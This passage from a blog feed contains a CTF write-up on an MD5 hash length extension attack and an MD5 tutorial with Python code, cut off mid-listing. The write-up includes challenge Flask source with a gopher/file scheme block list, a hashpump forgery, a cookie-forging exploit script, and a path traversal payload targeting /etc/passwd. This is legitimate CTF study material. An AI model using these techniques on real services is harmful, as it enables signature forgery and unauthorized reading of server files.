punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true">#SandBox For Remote_Addr</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                tmpfile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> resp                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span>                f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true">#generate Sign For Action Scan.</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    action <span class="token operator">=</span> <span class="token string">"scan"</span>    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr    <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span><span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span>    check<span class="token operator">=</span>param<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"gopher"</span><span class="token punctuation">)</span> <span class="token operator">or</span> check<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">False</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><p>确实看起来好懵逼啊<br>意思是</p><pre><code>提示给的是 flag 在 ./flag.txt 中python 的 flask 框架，三个路由，index 用于获取源码，geneSign 用于生成 md5，De1ta 就是挑战大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，param=flag.txt，action 中要含有 read 和 scan，且 sign=md5(secert_key + param + action)</code></pre><p>使用哈希拓展攻击</p><pre><code>secert_key 是一个长度为 16 的字符串，在 /geneSign?param=flag.txt 中可以获取 md5(secert_key + &#39;flag.txt&#39; + &#39;scan&#39;) 的值,为 4bb4d74933b882b845a15a384f927bab，而目标则是获取 md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;) 的值</code></pre><p>首先用hashpump</p><pre class=" language-bash"><code class="language-bash">kitty@ubuntu:~/桌面$ hashpumpInput Signature: 4bb4d74933b882b845a15a384f927babInput Data: scanInput Key Length: 24Input Data to Add: <span class="token function">read</span> 13e9cdc14801527def75d258d46cab59scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</code></pre><p>所以exp为:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://acc709a0-59ca-44ac-9af9-5cf20b5635c0.node2.buuoj.cn.wetolink.com:82/De1ta?param=flag.txt'</span>cookies <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">'sign'</span><span class="token punctuation">:</span> <span class="token string">'13e9cdc14801527def75d258d46cab59'</span><span class="token punctuation">,</span>  <span class="token string">'action'</span><span class="token punctuation">:</span> <span class="token string">'scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read'</span><span class="token punctuation">,</span>  <span class="token punctuation">}</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>也可以字符串拼接<br>不妨假设 secert_key 是 xxx ，那么在开始访问 <code>/geneSign?param=flag.txt</code> 的时候，返回的 md5 就是 <code>md5(&#39;xxx&#39; + &#39;flag.txt&#39; + &#39;scan&#39;)</code> ，在 python 里面上述表达式就相当于<code>md5(xxxflag.txtscan)</code>，这就很有意思了。</p><p>直接构造访问<code>/geneSign?param=flag.txtread</code> ，拿到的 md5 就是<code>md5(&#39;xxx&#39; + &#39;flag.txtread&#39; + &#39;scan&#39;</code>) ，等价于 <code>md5(&#39;xxxflag.txtreadscan&#39;)</code>，这就达到了目标。<br>因为<code>md5(&#39;xxx&#39; + &#39;flag.txtread&#39; + &#39;scan&#39;)等于md5(&#39;xxx&#39; + &#39;flag.txt&#39; + &#39;readscan&#39;)</code><br>然后直接访问 <code>/De1ta?param=flag.txt</code>构造 <code>cookie: action=readscan;sign={上面获得的md5值}</code>即可</p><h3 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h3><p>通过以上的分析，想必大家对此攻击有了更深入的认识。只要存在脆弱的（使用此类散列算法）Message authentication codes (MACs)用于验证信息真实性的地方就很可能受此攻击。<br>比如，我们发现了这样的一个下载文件的接口：<code>/download?name=test.pdf&amp;sig=6543109bb53887f7bb46fe424f26e24a</code>sig可能是这个文件的某种校验签名，如果想通过这个接口下载其他文件就会失败，因为sig校验不过。同时还会发现<code>md5(name) !== sig</code>，很明显在校验算法中添加了盐，如果我们想下载任意的文件比如<code>test.pdf%00/../../../../etc/passwd</code>，正常情况下是没办法的，因为有盐，所以我们无法构造自己的签名值，但是如果服务端使用了类似<code>if ($sig === md5($salt.$name))</code>的校验代码，那么就会存在此攻击。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5算法的学习和c-python3的实现</title>
      <link href="/2019/11/19/md5-suan-fa-de-xue-xi-he-c-python3-de-shi-xian/"/>
      <url>/2019/11/19/md5-suan-fa-de-xue-xi-he-c-python3-de-shi-xian/</url>
      
        <content type="html"><![CDATA[<h3 id="MD5算法分析MD5算法底层原理："><a href="#MD5算法分析MD5算法底层原理：" class="headerlink" title="MD5算法分析MD5算法底层原理："></a>MD5算法分析MD5算法底层原理：</h3><p>简单概括起来，MD5算法的过程分为四步：处理原文，设置初始值，循环加工，拼接结果。</p><p>第一步:处理原文</p><p>首先，我们计算出原文长度(bit)对512求余的结果，如果不等于448，就需要填充原文使得原文对512求余的结果等于448。填充的方法是第一位填充1，其余位填充0。填充完后，信息的长度就是512*N+448。</p><p>之后，用剩余的位置（512-448=64位）记录原文的真正长度，把长度的二进制值补在最后。这样处理后的信息长度就是512*(N+1)。<br>举例：消息内容为“gnubd”，就能得到以下内容</p><pre><code>67 6E 62 75 64 80 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 28 00 00 00 00 00 00 00 </code></pre><p>注意到最后面这里有个0x28，数8个字节，就是0x0000000000000028，刚刚好是十进制的40，消息的内容是5个字节，也就是40位，还要注意到这里是小端字节序存储<br>第二步:设置初始值</p><p>MD5的哈希结果长度为128位，按每32位分成一组共4组。这4组结果是由4个初始值A、B、C、D经过不断演变得到。MD5的官方实现中，A、B、C、D的初始值如下（16进制）：</p><pre><code>A=0x01234567B=0x89ABCDEFC=0xFEDCBA98D=0x76543210</code></pre><p>第三步:循环加工</p><p>这一步是最复杂的一步，我们看看下面这张图，此图代表了单次A,B,C,D值演变的流程。</p><p><img src="2.png" alt="img"></p><p>图中，A，B，C，D就是哈希值的四个分组。每一次循环都会让旧的ABCD产生新的ABCD。一共进行多少次循环呢？由处理后的原文长度决定。</p><p>假设处理后的原文长度是M</p><p>主循环次数 = M / 512</p><p>每个主循环中包含 512 / 32 * 4 = 64 次 子循环。</p><p>上面这张图所表达的就是单次子循环的流程。</p><p>下面对图中其他元素一一解释：</p><p>1.绿色F</p><p>图中的绿色F，代表非线性函数。官方MD5所用到的函数有四种：</p><pre><code>F(X, Y, Z) =(X&amp;Y) | ((~X) &amp; Z)G(X, Y, Z) =(X&amp;Z) | (Y &amp; (~Z))H(X, Y, Z) =X^Y^ZI(X, Y, Z)=Y^(X|(~Z))</code></pre><p>在主循环下面64次子循环中，F、G、H、I 交替使用，第一个16次使用F，第二个16次使用G，第三个16次使用H，第四个16次使用I。</p><p>2.红色“田”字</p><p>很简单，红色的田字代表相加的意思。</p><p>3.Mi</p><p>Mi是第一步处理后的原文。在第一步中，处理后原文的长度是512的整数倍。把原文的每512位再分成16等份，命名为M0<del>M15，每一等份长度32。在64次子循环中，每16次循环，都会交替用到M1</del>M16之一。</p><p>4、Ki</p><p>一个常量，在64次子循环中，每一次用到的常量都是不同的。</p><p>5.黄色的&lt;&lt;&lt;</p><p>左移S位，S的值也是常量。</p><p>“流水线”的最后，让计算的结果和B相加，取代原先的B。新ABCD的产生可以归纳为：</p><p>新A = 原d</p><p>新B = b+((a+F(b,c,d)+Mj+Ki)&lt;&gt;</p><p>新C = 原b</p><p>新D = 原c</p><p>总结一下主循环中的64次子循环，可以归纳为下面的四部分：</p><p>第一轮：</p><pre><code>FF(a,b,c,d,M0,7,0xd76aa478） s[0]=7, K[0] = 0xd76aa478FF(a,b,c,d,M1,12,0xe8c7b756） s[1]=12, K[1] = 0xe8c7b756FF(a,b,c,d,M2,17,0x242070db)FF(a,b,c,d,M3,22,0xc1bdceee)FF(a,b,c,d,M4,7,0xf57c0faf)FF(a,b,c,d,M5,12,0x4787c62a)FF(a,b,c,d,M6,17,0xa8304613）FF(a,b,c,d,M7,22,0xfd469501）FF(a,b,c,d,M8,7,0x698098d8）FF(a,b,c,d,M9,12,0x8b44f7af)FF(a,b,c,d,M10,17,0xffff5bb1）FF(a,b,c,d,M11,22,0x895cd7be)FF(a,b,c,d,M12,7,0x6b901122）FF(a,b,c,d,M13,12,0xfd987193）FF(a,b,c,d,M14,17, 0xa679438e)FF(a,b,c,d,M15,22,0x49b40821）</code></pre><p>第二轮：</p><pre><code>GG(a,b,c,d,M1,5,0xf61e2562）GG(a,b,c,d,M6,9,0xc040b340）GG(a,b,c,d,M11,14,0x265e5a51）GG(a,b,c,d,M0,20,0xe9b6c7aa)GG(a,b,c,d,M5,5,0xd62f105d)GG(a,b,c,d,M10,9,0x02441453）GG(a,b,c,d,M15,14,0xd8a1e681）GG(a,b,c,d,M4,20,0xe7d3fbc8）GG(a,b,c,d,M9,5,0x21e1cde6）GG(a,b,c,d,M14,9,0xc33707d6）GG(a,b,c,d,M3,14,0xf4d50d87）GG(a,b,c,d,M8,20,0x455a14ed)GG(a,b,c,d,M13,5,0xa9e3e905）GG(a,b,c,d,M2,9,0xfcefa3f8）GG(a,b,c,d,M7,14,0x676f02d9）GG(a,b,c,d,M12,20,0x8d2a4c8a)</code></pre><p>第三轮：</p><pre><code>HH(a,b,c,d,M5,4,0xfffa3942）HH(a,b,c,d,M8,11,0x8771f681）HH(a,b,c,d,M11,16,0x6d9d6122）HH(a,b,c,d,M14,23,0xfde5380c)HH(a,b,c,d,M1,4,0xa4beea44）HH(a,b,c,d,M4,11,0x4bdecfa9）HH(a,b,c,d,M7,16,0xf6bb4b60）HH(a,b,c,d,M10,23,0xbebfbc70）HH(a,b,c,d,M13,4,0x289b7ec6）HH(a,b,c,d,M0,11,0xeaa127fa)HH(a,b,c,d,M3,16,0xd4ef3085）HH(a,b,c,d,M6,23,0x04881d05）HH(a,b,c,d,M9,4,0xd9d4d039）HH(a,b,c,d,M12,11,0xe6db99e5）HH(a,b,c,d,M15,16,0x1fa27cf8）HH(a,b,c,d,M2,23,0xc4ac5665）</code></pre><p>第四轮：</p><pre><code>Ⅱ（a,b,c,d,M0,6,0xf4292244）Ⅱ（a,b,c,d,M7,10,0x432aff97）Ⅱ（a,b,c,d,M14,15,0xab9423a7）Ⅱ（a,b,c,d,M5,21,0xfc93a039）Ⅱ（a,b,c,d,M12,6,0x655b59c3）Ⅱ（a,b,c,d,M3,10,0x8f0ccc92）Ⅱ（a,b,c,d,M10,15,0xffeff47d)Ⅱ（a,b,c,d,M1,21,0x85845dd1）Ⅱ（a,b,c,d,M8,6,0x6fa87e4f)Ⅱ（a,b,c,d,M15,10,0xfe2ce6e0)Ⅱ（a,b,c,d,M6,15,0xa3014314）Ⅱ（a,b,c,d,M13,21,0x4e0811a1）Ⅱ（a,b,c,d,M4,6,0xf7537e82）Ⅱ（a,b,c,d,M11,10,0xbd3af235）Ⅱ（a,b,c,d,M2,15,0x2ad7d2bb)Ⅱ（a,b,c,d,M9,21,0xeb86d391）</code></pre><p>第四步:拼接结果</p><p>这一步就很简单了，把循环加工最终产生的A，B，C，D四个值拼接在一起，转换成字符串即可。</p><h3 id="简单实现"><a href="#简单实现" class="headerlink" title="简单实现"></a>简单实现</h3><p><img src="1.png" alt="img"></p><h4 id="python3版本"><a href="#python3版本" class="headerlink" title="python3版本"></a>python3版本</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># MD5 实现及其验证</span><span class="token keyword">import</span> mathrotate_amounts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span>                  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span>                  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span>                  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">]</span>constants <span class="token operator">=</span> <span class="token punctuation">[</span>int<span class="token punctuation">(</span>abs<span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFF</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># A B C D</span>init_values <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x67452301</span><span class="token punctuation">,</span> <span class="token number">0xefcdab89</span><span class="token punctuation">,</span> <span class="token number">0x98badcfe</span><span class="token punctuation">,</span> <span class="token number">0x10325476</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 非线性函数</span>functions <span class="token operator">=</span> <span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token keyword">lambda</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">:</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;</span> c<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token operator">~</span>b <span class="token operator">&amp;</span> d<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> \            <span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token keyword">lambda</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">:</span> <span class="token punctuation">(</span>d <span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token operator">~</span>d <span class="token operator">&amp;</span> c<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> \            <span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token keyword">lambda</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">:</span> b <span class="token operator">^</span> c <span class="token operator">^</span> d<span class="token punctuation">]</span> <span class="token operator">+</span> \            <span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token keyword">lambda</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">:</span> c <span class="token operator">^</span> <span class="token punctuation">(</span>b <span class="token operator">|</span> <span class="token operator">~</span>d<span class="token punctuation">)</span><span class="token punctuation">]</span>index_functions <span class="token operator">=</span> <span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token keyword">lambda</span> i<span class="token punctuation">:</span> i<span class="token punctuation">]</span> <span class="token operator">+</span> \                  <span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token keyword">lambda</span> i<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">*</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> \                  <span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token keyword">lambda</span> i<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>i <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> \                  <span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">[</span><span class="token keyword">lambda</span> i<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 对x左移amount位</span><span class="token keyword">def</span> <span class="token function">left_rotate</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xFFFFFFFF</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token operator">&lt;&lt;</span>amount<span 